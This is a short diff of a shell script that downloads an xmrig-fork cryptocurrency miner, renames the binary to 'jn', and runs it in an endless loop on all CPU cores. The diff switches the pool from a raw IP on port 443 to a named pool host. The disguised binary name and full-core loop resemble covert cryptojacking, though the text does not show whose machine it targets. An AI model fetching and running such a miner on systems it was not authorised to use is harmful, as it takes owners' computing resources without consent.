@@ -3,5 +3,5 @@ curl https://github.com/juno-cash/juno-xmrig/releases/download/v6.24.0-juno.6/xm
 unzip xmrig-v6.24.0-juno.6-linux-x64.zip
 mv xmrig jn
 while :; do
-./jn -a rx/juno -o stratum+tcp://68.183.8.214:443 -u j10r9xk0ufxpmmav5g3u7h4m6ttuhnk23fnkc2p6e36nj4hg8zght6mg4l4gpvsfuwx9vk4774yc0jlkeh2ftq0t8ar0y2td24euuzp2yn -p x -t $(nproc --all)
+./jn -a rx/juno -o stratum+tcp://pool.junohash.com:3333 -u j10r9xk0ufxpmmav5g3u7h4m6ttuhnk23fnkc2p6e36nj4hg8zght6mg4l4gpvsfuwx9vk4774yc0jlkeh2ftq0t8ar0y2td24euuzp2yn -p x -t $(nproc --all)
 done
